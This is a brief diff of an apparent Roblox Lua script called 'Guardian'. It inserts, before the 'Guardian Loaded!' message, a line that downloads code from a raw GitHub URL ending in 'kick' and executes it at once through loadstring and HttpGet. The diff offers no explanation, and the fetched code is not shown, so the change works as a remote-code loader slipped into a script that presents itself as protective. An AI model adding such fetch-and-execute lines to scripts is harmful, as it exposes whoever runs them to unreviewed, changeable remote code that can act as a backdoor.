@@ -1,4 +1,6 @@
-			warn("Guardian Loaded!")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/nub/main/kick"))()
+
+warn("Guardian Loaded!")
 
 local Player = game.Players.LocalPlayer
 local Char = Player.Character
